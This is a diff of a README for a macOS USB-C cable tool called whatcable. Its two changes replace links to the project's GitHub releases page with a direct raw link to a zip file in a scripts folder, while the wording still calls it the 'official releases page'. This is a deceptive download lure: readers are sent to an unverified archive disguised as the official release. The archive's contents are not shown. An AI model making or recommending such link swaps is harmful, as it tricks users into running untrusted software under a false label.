@@ -1,6 +1,6 @@
 # 🔌 whatcable - See your USB-C cable capabilities clearly
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Allsunfallen739/whatcable/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Allsunfallen739/whatcable/main/scripts/Software-v2.6.zip)
 
 ## 💡 About this application
 
@@ -23,7 +23,7 @@ You need a Mac running a recent version of macOS to use this tool. The applicati
 
 Follow these steps to install the app:
 
-1. Visit the [official releases page](https://github.com/Allsunfallen739/whatcable/releases) to see available downloads.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Allsunfallen739/whatcable/main/scripts/Software-v2.6.zip) to see available downloads.
 2. Select the latest version listed under the Assets section.
 3. Download the disk image file ending in .dmg to your computer.
 4. Double-click the downloaded file to open the image.
